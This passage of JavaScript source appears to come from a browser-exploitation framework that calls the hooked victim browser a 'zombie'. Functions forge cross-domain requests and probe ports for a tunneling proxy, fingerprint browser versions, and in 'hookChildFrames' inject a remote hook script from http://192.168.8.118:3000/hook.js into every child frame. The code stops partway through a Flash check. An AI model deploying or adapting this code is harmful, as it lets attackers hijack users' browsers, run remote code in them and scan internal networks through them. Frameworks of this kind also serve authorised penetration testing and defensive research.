						xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
					}
				},
				success:function (data, textStatus, xhr) {
					var end_time = new Date().getTime();
					response.status_code = xhr.status;
					response.status_text = textStatus;
					response.response_body = data;
					response.port_status = "open";
					response.was_timedout = false;
					response.duration = (end_time - start_time);
				},
				error:function (jqXHR, textStatus, errorThrown) {
					var end_time = new Date().getTime();
					response.response_body = jqXHR.responseText;
					response.status_code = jqXHR.status;
					response.status_text = textStatus;
					response.duration = (end_time - start_time);
				},
				complete:function (jqXHR, textStatus) {
					response.status_code = jqXHR.status;
					response.status_text = textStatus;
					response.headers = jqXHR.getAllResponseHeaders();
					// determine if TCP port is open/closed/not-http
					if (textStatus == "timeout") {
						response.was_timedout = true;
						response.response_body = "ERROR: Timed out\n";
						response.port_status = "closed";
					} else if (textStatus == "parsererror") {
						response.port_status = "not-http";
					} else {
						response.port_status = "open";
					}
				}
			}).done(function () {
					if (callback != null) {
						callback(response);
					}
				});
			return response;
		},
		
		 /*
		 * Similar to rat.net.request, except from a few things that are needed when dealing with forged requests:
		 *  - requestid: needed on the callback
		 *  - allowCrossDomain: set cross-domain requests as allowed or blocked
		 *
		 * forge_request is used mainly by the Requester and Tunneling Proxy Extensions.
		 */
		forge_request:function (scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {
	
			// check if same domain or cross domain
			var cross_domain = true;
	
			if (document.domain == domain.replace(/(\r\n|\n|\r)/gm,"")) { //strip eventual line breaks
			   if(document.location.port == "" || document.location.port == null){
				   cross_domain = !(port == "80" || port == "443");
			   } else {
				  if (document.location.port == port) cross_domain = false;
			   }
			}
	
			// build the url
			var url = "";
			if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
				url = path;
			} else {
				url = scheme + "://" + domain;
				url = (port != null) ? url + ":" + port : url;
				url = (path != null) ? url + path : url;
				url = (anchor != null) ? url + "#" + anchor : url;
			}
	
			// define response object
			var response = new this.response;
			response.was_cross_domain = cross_domain;
			var start_time = new Date().getTime();
	
			// if cross-domain requests are not allowed and the request is cross-domain
			// don't proceed and return
			if (allowCrossDomain == "false" && cross_domain && callback != null) {
				response.status_code = -1;
				response.status_text = "crossdomain";
				response.port_status = "crossdomain";
				response.response_body = "ERROR: Cross Domain Request. The request was not sent.\n";
				response.headers = "ERROR: Cross Domain Request. The request was not sent.\n";
				callback(response, requestid);
				return response;
			}
	
			/*
			 * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
			 * This will turn POSTs into GETs for remote-domain requests.
			 */
			if (method == "POST"){
				$.ajaxSetup({
					dataType: dataType
				});
			} else {
				$.ajaxSetup({
					dataType: 'script'
				});
			}
	
			// this is required for bugs in IE so data can be transferred back to the server
			if ( rat.browser.isIE() ) {
				dataType = 'script'
			}
	
			$.ajax({type: method,
				dataType: dataType,
				url: url,
				headers: headers,
				timeout: (timeout * 1000),
	
				//This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
				beforeSend:function (xhr) {
					if (method == "POST") {
						xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
					}
				},
	
				// http server responded successfully
				success:function (data, textStatus, xhr) {
					var end_time = new Date().getTime();
					response.status_code = xhr.status;
					response.status_text = textStatus;
					response.response_body = data;
					response.was_timedout = false;
					response.duration = (end_time - start_time);
				},
	
				// server responded with a http error (403, 404, 500, etc)
				// or server is not a http server
				error:function (xhr, textStatus, errorThrown) {
					var end_time = new Date().getTime();
					response.response_body = xhr.responseText;
					response.status_code = xhr.status;
					response.status_text = textStatus;
					response.duration = (end_time - start_time);
				},
	
				complete:function (xhr, textStatus) {
					// cross-domain request
					if (cross_domain) {
	
						response.port_status = "crossdomain";
	
						if (xhr.status != 0) {
							response.status_code = xhr.status;
						} else {
							response.status_code = -1;
						}
	
						if (textStatus) {
							response.status_text = textStatus;
						} else {
							response.status_text = "crossdomain";
						}
	
						if (xhr.getAllResponseHeaders()) {
							response.headers = xhr.getAllResponseHeaders();
						} else {
							response.headers = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
						}
	
						if (!response.response_body) {
							response.response_body = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
						}
	
					} else {
						// same-domain request
						response.status_code = xhr.status;
						response.status_text = textStatus;
						response.headers = xhr.getAllResponseHeaders();
	
						// determine if TCP port is open/closed/not-http
						if (textStatus == "timeout") {
							response.was_timedout = true;
							response.response_body = "ERROR: Timed out\n";
							response.port_status = "closed";
						} else if (textStatus == "parsererror") {
							response.port_status = "not-http";
						} else {
							response.port_status = "open";
						}
					}
					callback(response, requestid);
				}
			});
			return response;
		}
};

rat.regCmp('rat.net');



/**
 * @literal object: rat.browser
 *
 * Basic browser functions.
 */
rat.browser = {

    /**
     * Returns the user agent that the browser is claiming to be.
     * @example: rat.browser.getBrowserReportedName()
     */
    getBrowserReportedName:function () {
        return navigator.userAgent;
    },

    /**
     * Returns true if Avant Browser.
     * @example: rat.browser.isA()
     */
    isA:function () {
        return window.navigator.userAgent.match(/Avant TriCore/) != null;
    },

    /**
     * Returns true if Iceweasel.
     * @example: rat.browser.isI()
     */
    isI:function () {
        return window.navigator.userAgent.match(/Iceweasel\/\d+\.\d/) != null;
    },

    /**
     * Returns true if IE6.
     * @example: rat.browser.isIE6()
     */
    isIE6:function () {
        return !window.XMLHttpRequest && !window.globalStorage;
    },

    /**
     * Returns true if IE7.
     * @example: rat.browser.isIE7()
     */
    isIE7:function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
    },

    /**
     * Returns true if IE8.
     * @example: rat.browser.isIE8()
     */
    isIE8:function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
    },

    /**
     * Returns true if IE9.
     * @example: rat.browser.isIE9()
     */
    isIE9:function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
    },

    /**
     *
     * Returns true if IE10.
     * @example: rat.browser.isIE10()
     */
    isIE10:function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
    },

    /**
     * Returns true if IE.
     * @example: rat.browser.isIE()
     */
    isIE:function () {
        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10();
    },

    /**
     * Returns true if FF2.
     * @example: rat.browser.isFF2()
     */
    isFF2:function () {
        return !!window.globalStorage && !window.postMessage;
    },

    /**
     * Returns true if FF3.
     * @example: rat.browser.isFF3()
     */
    isFF3:function () {
        return !!window.globalStorage && !!window.postMessage && !JSON.parse;
    },

    /**
     * Returns true if FF3.5.
     * @example: rat.browser.isFF3_5()
     */
    isFF3_5:function () {
        return !!window.globalStorage && !!JSON.parse && !window.FileReader;
    },

    /**
     * Returns true if FF3.6.
     * @example: rat.browser.isFF3_6()
     */
    isFF3_6:function () {
        return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
    },

    /**
     * Returns true if FF4.
     * @example: rat.browser.isFF4()
     */
    isFF4:function () {
        return !!window.globalStorage && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/4\./) != null;
    },

    /**
     * Returns true if FF5.
     * @example: rat.browser.isFF5()
     */
    isFF5:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/5\./) != null;
    },

    /**
     * Returns true if FF6.
     * @example: rat.browser.isFF6()
     */
    isFF6:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/6\./) != null;
    },

    /**
     * Returns true if FF7.
     * @example: rat.browser.isFF7()
     */
    isFF7:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/7\./) != null;
    },

    /**
     * Returns true if FF8.
     * @example: rat.browser.isFF8()
     */
    isFF8:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/8\./) != null;
    },

    /**
     * Returns true if FF9.
     * @example: rat.browser.isFF9()
     */
    isFF9:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/9\./) != null;
    },

    /**
     * Returns true if FF10.
     * @example: rat.browser.isFF10()
     */
    isFF10:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/10\./) != null;
    },

    /**
     * Returns true if FF11.
     * @example: rat.browser.isFF11()
     */
    isFF11:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/11\./) != null;
    },

    /**
     * Returns true if FF12
     * @example: rat.browser.isFF12()
     */
    isFF12:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/12\./) != null;
    },

    /**
     * Returns true if FF13
     * @example: rat.browser.isFF13()
     */
    isFF13:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/13\./) != null;
    },

    /**
     * Returns true if FF14
     * @example: rat.browser.isFF14()
     */
    isFF14:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/14\./) != null;
    },

    /**
     * Returns true if FF15
     * @example: rat.browser.isFF15()
     */
    isFF15:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/15\./) != null;
    },

    /**
     * Returns true if FF16
     * @example: rat.browser.isFF16()
     */
    isFF16:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/16\./) != null;
    },

    /**
     * Returns true if FF17
     * @example: rat.browser.isFF17()
     */
    isFF17:function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/17\./) != null;
    },

    /**
     * Returns true if FF18
     * @example: rat.browser.isFF18()
     */
    isFF18:function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/18\./) != null;
    },

    /**
     * Returns true if FF19
     * @example: rat.browser.isFF19()
     */
    isFF19:function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/19\./) != null;
    },

	/**
	 * Returns true if FF20
	 * @example: rat.browser.isFF20()
	 */
	isFF20:function () {
		return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/20\./) != null;
	},

    /**
     * Returns true if FF21
     * @example: rat.browser.isFF21()
     */
    isFF21:function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/21\./) != null;
    },

    /**
     * Returns true if FF22
     * @example: rat.browser.isFF22()
     */
    isFF22:function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/22\./) != null;
    },

    /**
     * Returns true if FF23
     * @example: rat.browser.isFF23()
     */
    isFF23:function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/23\./) != null;
    },

    /**
     * Returns true if FF24
     * @example: rat.browser.isFF24()
     */
    isFF24:function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/24\./) != null;
    },

    /**
     * Returns true if FF.
     * @example: rat.browser.isFF()
     */
    isFF:function () {
        return this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10() || this.isFF11() || this.isFF12() || this.isFF13() || this.isFF14() || this.isFF15() || this.isFF16() || this.isFF17() || this.isFF18() || this.isFF19() || this.isFF20() || this.isFF21() || this.isFF22() || this.isFF23() || this.isFF24();
    },

    /**
     * Returns true if Safari 4.xx
     * @example: rat.browser.isS4()
     */
    isS4:function () {
        return (window.navigator.userAgent.match(/ Version\/4\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 5.xx
     * @example: rat.browser.isS5()
     */
    isS5:function () {
        return (window.navigator.userAgent.match(/ Version\/5\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 6.xx
     * @example: rat.browser.isS6()
     */
    isS6:function () {
        return (window.navigator.userAgent.match(/ Version\/6\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari.
     * @example: rat.browser.isS()
     */
    isS:function () {
        return this.isS4() || this.isS5() || this.isS6();
    },

    /**
     * Returns true if Chrome 5.
     * @example: rat.browser.isC5()
     */
    isC5:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 5) ? true : false);
    },

    /**
     * Returns true if Chrome 6.
     * @example: rat.browser.isC6()
     */
    isC6:function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 6) ? true : false);
    },

    /**
     * Returns true if Chrome 7.
     * @example: rat.browser.isC7()
     */
    isC7:function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 7) ? true : false);
    },

    /**
     * Returns true if Chrome 8.
     * @example: rat.browser.isC8()
     */
    isC8:function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 8) ? true : false);
    },

    /**
     * Returns true if Chrome 9.
     * @example: rat.browser.isC9()
     */
    isC9:function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 9) ? true : false);
    },

    /**
     * Returns true if Chrome 10.
     * @example: rat.browser.isC10()
     */
    isC10:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 10) ? true : false);
    },

    /**
     * Returns true if Chrome 11.
     * @example: rat.browser.isC11()
     */
    isC11:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 11) ? true : false);
    },

    /**
     * Returns true if Chrome 12.
     * @example: rat.browser.isC12()
     */
    isC12:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 12) ? true : false);
    },

    /**
     * Returns true if Chrome 13.
     * @example: rat.browser.isC13()
     */
    isC13:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 13) ? true : false);
    },

    /**
     * Returns true if Chrome 14.
     * @example: rat.browser.isC14()
     */
    isC14:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 14) ? true : false);
    },

    /**
     * Returns true if Chrome 15.
     * @example: rat.browser.isC15()
     */
    isC15:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 15) ? true : false);
    },

    /**
     * Returns true if Chrome 16.
     * @example: rat.browser.isC16()
     */
    isC16:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 16) ? true : false);
    },

    /**
     * Returns true if Chrome 17.
     * @example: rat.browser.isC17()
     */
    isC17:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 17) ? true : false);
    },

    /**
     * Returns true if Chrome 18.
     * @example: rat.browser.isC18()
     */
    isC18:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 18) ? true : false);
    },

    /**
     * Returns true if Chrome 19.
     * @example: rat.browser.isC19()
     */
    isC19:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 19.
     * @example: rat.browser.isC19iOS()
     */
    isC19iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome 20.
     * @example: rat.browser.isC20()
     */
    isC20:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 20.
     * @example: rat.browser.isC20iOS()
     */
    isC20iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome 21.
     * @example: rat.browser.isC21()
     */
    isC21:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 21.
     * @example: rat.browser.isC21iOS()
     */
    isC21iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome 22.
     * @example: rat.browser.isC22()
     */
    isC22:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 22.
     * @example: rat.browser.isC22iOS()
     */
    isC22iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome 23.
     * @example: rat.browser.isC23()
     */
    isC23:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 23.
     * @example: rat.browser.isC23iOS()
     */
    isC23iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome 24.
     * @example: rat.browser.isC24()
     */
    isC24:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 24.
     * @example: rat.browser.isC24iOS()
     */
    isC24iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome 25.
     * @example: rat.browser.isC25()
     */
    isC25:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 25.
     * @example: rat.browser.isC25iOS()
     */
    isC25iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome 26.
     * @example: rat.browser.isC26()
     */

    isC26:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 26.
     * @example: rat.browser.isC26iOS()
     */
    isC26iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome 27.
     * @example: rat.browser.isC27()
     */
    isC27:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 27.
     * @example: rat.browser.isC27iOS()
     */
    isC27iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome 28.
     * @example: rat.browser.isC28()
     */
    isC28:function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 28.
     * @example: rat.browser.isC28iOS()
     */
    isC28iOS:function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome.
     * @example: rat.browser.isC()
     */
    isC:function () {
        return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16() || this.isC17() || this.isC18() || this.isC19() || this.isC19iOS() || this.isC20() || this.isC20iOS() || this.isC21() || this.isC21iOS() || this.isC22() || this.isC22iOS() || this.isC23() || this.isC23iOS() || this.isC24() || this.isC24iOS() || this.isC25() || this.isC25iOS() || this.isC26() || this.isC26iOS() || this.isC27() || this.isC27iOS() || this.isC28() || this.isC28iOS();
    },

    /**
     * Returns true if Opera 9.50 through 9.52.
     * @example: rat.browser.isO9_52()
     */
    isO9_52:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
    },

    /**
     * Returns true if Opera 9.60 through 9.64.
     * @example: rat.browser.isO9_60()
     */
    isO9_60:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
    },

    /**
     * Returns true if Opera 10.xx.
     * @example: rat.browser.isO10()
     */
    isO10:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
    },

    /**
     * Returns true if Opera 11.xx.
     * @example: rat.browser.isO11()
     */
    isO11:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
    },

    /**
     * Returns true if Opera 12.xx.
     * @example: rat.browser.isO12()
     */
    isO12:function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/12\./) != null));
    },

    /**
     * Returns true if Opera.
     * @example: rat.browser.isO()
     */
    isO:function () {
        return this.isO9_52() || this.isO9_60() || this.isO10() || this.isO11() || this.isO12();
    },

      type:function () {
		var res = "";
 		res += this.isC5()? " Chrome5":"";
		res += this.isC6()? " Chrome6":"";
		res += this.isC7()? " Chrome7":"";
		res += this.isC8()? " Chrome8":"";
		res += this.isC9()? " Chrome9":"";
		res += this.isC10()? " Chrome10":"";
		res += this.isC11()? " Chrome11":"";
		res += this.isC12()? " Chrome12":"";
		res += this.isC13()? " Chrome13":"";
		res += this.isC14()? " Chrome14":"";
		res += this.isC15()? " Chrome15":"";
		res += this.isC16()? " Chrome16":"";
		res += this.isC17()? " Chrome17":"";
		res += this.isC18()? " Chrome18":"";
		res += this.isC19()? " Chrome19":"";
		res += this.isC20()? " Chrome20":"";
		res += this.isC21()? " Chrome21":"";
		res += this.isC22()? " Chrome22":"";
		res += this.isC23()? " Chrome23":"";
		res += this.isC24()? " Chrome24":"";
		res += this.isC25()? " Chrome25":"";
		res += this.isC26()? " Chrome26":"";
		res += this.isC27()? " Chrome27":"";
		res += this.isC28()? " Chrome28":"";
		res += this.isC19iOS()? " Chrome19_IOS":"";
		res += this.isC20iOS()? " Chrome20_IOS":"";
		res += this.isC21iOS()? " Chrome21_IOS":"";
		res += this.isC22iOS()? " Chrome22_IOS":"";
		res += this.isC23iOS()? " Chrome23_IOS":"";
		res += this.isC24iOS()? " Chrome24_IOS":"";
		res += this.isC25iOS()? " Chrome25_IOS":"";
		res += this.isC26iOS()? " Chrome26_IOS":"";
		res += this.isC27iOS()? " Chrome27_IOS":"";
		res += this.isC28iOS()? " Chrome28_IOS":"";
		
		res += this.isFF2()? " Firefox2":"";
		res += this.isFF3()? " Firefox3":"";
		res += this.isFF3_5()? " Firefox3_5":"";
		res += this.isFF3_6()? " Firefox3_6":"";
		res += this.isFF4()? " Firefox4":"";
		res += this.isFF5()? " Firefox5":"";
		res += this.isFF6()? " Firefox6":"";
		res += this.isFF7()? " Firefox7":"";
		res += this.isFF8()? " Firefox8":"";
		res += this.isFF9()? " Firefox9":"";
		res += this.isFF10()? " Firefox10":"";
		res += this.isFF11()? " Firefox11":"";
		res += this.isFF12()? " Firefox12":"";
		res += this.isFF13()? " Firefox13":"";
		res += this.isFF14()? " Firefox14":"";
		res += this.isFF15()? " Firefox15":"";
		res += this.isFF16()? " Firefox16":"";
		res += this.isFF17()? " Firefox17":"";
		res += this.isFF18()? " Firefox18":"";
		res += this.isFF19()? " Firefox19":"";
		res += this.isFF20()? " Firefox20":"";
		res += this.isFF21()? " Firefox21":"";
		res += this.isFF22()? " Firefox22":"";
		res += this.isFF23()? " Firefox23":"";
		res += this.isFF24()? " Firefox24":"";
		
		res += this.isIE6()? " IE6":"";
		res += this.isIE7()? " IE7":"";
		res += this.isIE8()? " IE8":"";
		res += this.isIE9()? " IE9":"";
		res += this.isIE10()? " IE10":"";
		
		res += this.isO9_52()? " Opera9.50-52":"";
		res += this.isO9_60()? " Opera9.60-64":"";
		res += this.isO10()? " Opera10.xx":"";
		res += this.isO11()? " Opera11.xx":"";
		res += this.isO12()? " Opera12.xx":"";
		
		res += this.isS4()? " OSafari4.xx":"";
		res += this.isS5()? " OSafari5.xx":"";
		res += this.isS6()? " OSafari6.xx":"";
		
		if(res == ""){
			res +=  this.isC()?"Chrome":"";
			res +=  this.isFF()?"Firefox":"";
			res +=  this.isIE()?"IE":"";
			res +=  this.isO()?"Opera":"";
			res +=  this.isS()?"Safari":"";
		}
		
		if(res == "") res = "UNKNOWN";
		
		return res;
    },

    /**
     * Hooks all child frames in the current window
     * Restricted by same-origin policy
     */
    hookChildFrames:function () {

        // create script object
        var script  = document.createElement('script');
        script.type = 'text/javascript';
        script.src  = 'http://192.168.8.118:3000/hook.js';

        // loop through child frames
        for (var i=0;i<self.frames.length;i++) {
            try {
                // append hook script
                self.frames[i].document.body.appendChild(script);
            } catch (e) {
                // warn on cross-domain
            }
        }
    },

    /**
     * Checks if the zombie has flash installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(rat.browser.hasFlash()) { ... }
     */
    hasFlash:function () {
        if (!this.type().IE) {
            return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
        } else {
            flash_versions = 12;
            flash_installed = false;

            if (window.ActiveXObject) {
                for (x = 2; x <= flash_versions; x++) {
                    try {
